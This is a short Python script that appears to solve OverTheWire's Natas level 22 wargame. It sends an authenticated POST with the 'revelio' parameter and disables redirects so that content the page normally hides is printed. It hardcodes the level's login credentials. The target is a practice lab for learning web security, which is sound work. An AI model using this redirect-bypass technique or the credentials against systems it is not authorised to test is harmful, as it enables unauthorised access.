import requests

url="http://natas22.natas.labs.overthewire.org?revelio"
auth=("natas22","d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz")

response=requests.post(url,auth=auth,allow_redirects=False)
print(response.text)